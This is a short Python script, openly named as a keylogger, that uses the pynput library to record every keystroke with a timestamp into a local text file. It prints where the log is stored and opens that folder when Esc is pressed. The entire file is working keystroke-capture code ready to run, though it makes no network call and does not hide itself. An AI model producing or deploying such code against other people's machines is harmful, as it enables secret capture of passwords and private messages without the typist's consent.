# keylogger_with_path.py

import os
import platform
import subprocess
from pynput import keyboard
from datetime import datetime

# Path where log will be saved (same folder as script)
log_file = os.path.join(os.getcwd(), "key_log.txt")

# Show path at startup
print(f"[INFO] Logs will be saved here: {log_file}")

def on_press(key):
    time_stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open(log_file, "a") as f:
            f.write(f"{time_stamp} - {key.char}\n")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"{time_stamp} - [{key}]\n")

def on_release(key):
    if key == keyboard.Key.esc:
        # Open the folder containing the log file
        folder = os.path.dirname(log_file)
        if platform.system() == "Windows":
            subprocess.Popen(f'explorer "{folder}"')
        elif platform.system() == "Darwin":  # macOS
            subprocess.Popen(["open", folder])
        else:  # Linux
            subprocess.Popen(["xdg-open", folder])
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
